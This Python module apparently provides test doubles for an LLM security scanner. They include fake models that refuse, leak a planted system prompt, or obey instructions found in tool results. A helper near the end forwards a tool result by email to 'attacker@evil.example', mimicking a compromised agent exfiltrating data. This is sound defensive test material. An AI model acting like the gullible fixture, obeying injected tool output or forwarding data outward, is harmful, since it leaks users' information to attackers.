import json
from collections.abc import Sequence
from itertools import chain, repeat

from guardana.core.target.access import AccessAnswer, AccessReply
from guardana.core.target.endpoint import ChatMessage, ToolCall, ToolCallReply, ToolSpec

_REFUSAL_REPLY = "I cannot help with that."
_COMPLETED = AccessReply(AccessAnswer.COMPLETION, 200, "answered with a chat completion")


class ScriptedTransport:
    """Replies with canned strings in order; the last one repeats once exhausted.

    Single-threaded by design: the reply sequence is an iterator, so a test that
    runs rules concurrently (`Runner(concurrency=N)`) would hand replies out in a
    scheduling-dependent order. Test one rule at a time, or give every reply the
    same content.
    """

    def __init__(self, *replies: str) -> None:
        if not replies:
            raise ValueError("ScriptedTransport needs at least one reply")
        self.scripted: tuple[str, ...] = replies
        """What this double was told to say, kept readable after the fact.

        The sequence below is an iterator and consuming it to find out what a
        fixture replied would change the behaviour being inspected. `rule test
        --write-corpus` reads this to turn a fixture into a labelled sample.
        """
        self._replies = chain(replies, repeat(replies[-1]))
        self.seen: list[Sequence[ChatMessage]] = []

    def send(
        self,
        base_url: str,
        model: str,
        messages: Sequence[ChatMessage],
        api_key: str | None,
    ) -> str:
        """Record what was asked and reply with the next canned answer."""
        self.seen.append(list(messages))
        return next(self._replies)


class RefusingTransport(ScriptedTransport):
    """A well-behaved model: refuses everything, leaks nothing."""

    def __init__(self) -> None:
        super().__init__(_REFUSAL_REPLY)


class ScriptedAccessTransport(ScriptedTransport):
    """A chat route that answers an access request by whether it carried a key.

    A request with no key gets `anonymous`, one with a key gets `credentialed`;
    `asked` records, in order, whether each request carried one. Chat requests are
    answered as `ScriptedTransport` answers them.
    """

    def __init__(
        self,
        anonymous: AccessReply,
        credentialed: AccessReply = _COMPLETED,
    ) -> None:
        super().__init__("OK")
        self.anonymous = anonymous
        self.credentialed = credentialed
        self.asked: list[bool] = []

    def check_access(self, base_url: str, model: str, api_key: str | None) -> AccessReply:
        """Record whether a key was sent and answer as scripted for that caller."""
        self.asked.append(api_key is not None)
        return self.anonymous if api_key is None else self.credentialed


class EchoingTransport:
    """A model that discloses its system prompt — the canary-leak fixture."""

    def send(
        self,
        base_url: str,
        model: str,
        messages: Sequence[ChatMessage],
        api_key: str | None,
    ) -> str:
        """Disclose the planted system prompt, if one was planted."""
        planted = [m.content for m in messages if m.role == "system"]
        if planted:
            return f"Sure, here is my system prompt: {planted[0]}"
        return _REFUSAL_REPLY


class ToolCallingScriptedTransport:
    """A model that, when offered tools, calls the tools it was told to.

    The double for excessive-agency fixtures: construct it with the tool names the
    model will reach for (none, for a well-behaved model) and drive a rule that
    offers tools. It also answers plain `chat` with a canned reply.
    """

    def __init__(self, *tool_names: str, text: str | None = None) -> None:
        self._tool_names = tool_names
        self._text = text
        self.offered: list[Sequence[ToolSpec]] = []

    def send(
        self,
        base_url: str,
        model: str,
        messages: Sequence[ChatMessage],
        api_key: str | None,
    ) -> str:
        """Answer a plain chat turn with a canned reply."""
        return self._text or "The answer is 4."

    def send_tools(
        self,
        base_url: str,
        model: str,
        messages: Sequence[ChatMessage],
        api_key: str | None,
        tools: Sequence[ToolSpec],
    ) -> ToolCallReply:
        """Report the configured tool calls (and any canned text)."""
        self.offered.append(list(tools))
        return ToolCallReply(
            text=self._text, tool_calls=tuple(ToolCall(name) for name in self._tool_names)
        )


class GullibleAgentTransport:
    """A model that does whatever a tool result tells it to — the positive fixture.

    Realistic in the way that matters: a tool result is untrusted input, and the
    failure these checks exist for is a model that treats it as instruction. On
    each turn it reaches for the first offered tool it has not used yet; when a
    previous result named a tool and an argument, it uses those instead.

    Pair it with `RefusingTransport` for the negative fixture: a model that
    answers in prose and never touches a tool.
    """

    def __init__(self, *, follow: str = "send_email") -> None:
        self._follow = follow
        self.offered: list[Sequence[ToolSpec]] = []

    def send(
        self,
        base_url: str,
        model: str,
        messages: Sequence[ChatMessage],
        api_key: str | None,
    ) -> str:
        """Answer a plain chat turn; the interesting behaviour is in `send_tools`."""
        return "Sure."

    def send_tools(
        self,
        base_url: str,
        model: str,
        messages: Sequence[ChatMessage],
        api_key: str | None,
        tools: Sequence[ToolSpec],
    ) -> ToolCallReply:
        """Obey the last tool result if it named a tool, else use the first one offered."""
        self.offered.append(list(tools))
        results = [m for m in messages if m.role == "tool"]
        names = {t.name for t in tools}
        if results and self._follow in names:
            already = any(call.name == self._follow for m in messages for call in m.tool_calls)
            if not already:
                return ToolCallReply(
                    text=None,
                    tool_calls=(
                        ToolCall(
                            name=self._follow,
                            arguments=_forwarding_arguments(results[-1].content),
                            id=f"call_{len(messages)}",
                        ),
                    ),
                )
        used = {call.name for m in messages for call in m.tool_calls}
        for spec in tools:
            if spec.name not in used:
                return ToolCallReply(
                    text=None,
                    tool_calls=(
                        ToolCall(name=spec.name, arguments="{}", id=f"call_{len(messages)}"),
                    ),
                )
        return ToolCallReply(text="Done.", tool_calls=())


def _forwarding_arguments(tool_result: str) -> str:
    """Pack a tool result into arguments, the way a compromised agent forwards it."""
    return json.dumps({"to": "attacker@evil.example", "body": tool_result})


class FailingTransport:
    """An unreachable endpoint: every call raises the given error."""

    def __init__(self, error: Exception) -> None:
        self._error = error

    def send(
        self,
        base_url: str,
        model: str,
        messages: Sequence[ChatMessage],
        api_key: str | None,
    ) -> str:
        """Fail the way an unreachable endpoint fails."""
        raise self._error


class ScriptExhaustedError(RuntimeError):
    """Raised when a run asks a scripted double for a turn or a session nobody wrote."""


class ScriptedAgentTransport:
    """Plays a written agent run: one reply per round trip, one script per session.

    The tool-calling counterpart of `ScriptedTransport`, and the double a
    declarative fixture's `turns:` builds. A fresh session — a history the harness
    has not put an assistant turn in yet — advances to the next script.

    **Nothing repeats and nothing is invented.** A turn or a session past the end
    of the script raises, because the alternative is a run that keeps calling the
    last tool until the step budget is gone: it truncates, the verdict becomes
    `inconclusive`, and a sample passes for a reason its author never wrote.
    """

    def __init__(self, *sessions: Sequence[ToolCallReply]) -> None:
        if not sessions or not all(sessions):
            raise ValueError("ScriptedAgentTransport needs at least one non-empty session")
        self.sessions: tuple[tuple[ToolCallReply, ...], ...] = tuple(
            tuple(session) for session in sessions
        )
        self._session = 0
        self._turn = 0
        self.offered: list[Sequence[ToolSpec]] = []

    def send(
        self,
        base_url: str,
        model: str,
        messages: Sequence[ChatMessage],
        api_key: str | None,
    ) -> str:
        """Refuse a plain chat turn: this double plays a run, and a run offers tools."""
        raise NotImplementedError("ScriptedAgentTransport plays an agent run, not a chat turn")

    def send_tools(
        self,
        base_url: str,
        model: str,
        messages: Sequence[ChatMessage],
        api_key: str | None,
        tools: Sequence[ToolSpec],
    ) -> ToolCallReply:
        """Return this session's next scripted reply, advancing on a fresh history."""
        self.offered.append(list(tools))
        if not any(message.role == "assistant" for message in messages):
            self._advance()
        script = self.sessions[self._session]
        if self._turn >= len(script):
            raise ScriptExhaustedError(
                f"session {self._session + 1} scripts {len(script)} turn(s) and the run "
                f"asked for turn {self._turn + 1}"
            )
        reply = script[self._turn]
        self._turn += 1
        return reply

    def _advance(self) -> None:
        if self._turn == 0 and self._session == 0:
            return  # the first session's first turn, not a boundary
        self._session += 1
        self._turn = 0
        if self._session >= len(self.sessions):
            raise ScriptExhaustedError(
                f"the run opened session {self._session + 1} and the script covers "
                f"{len(self.sessions)}"
            )
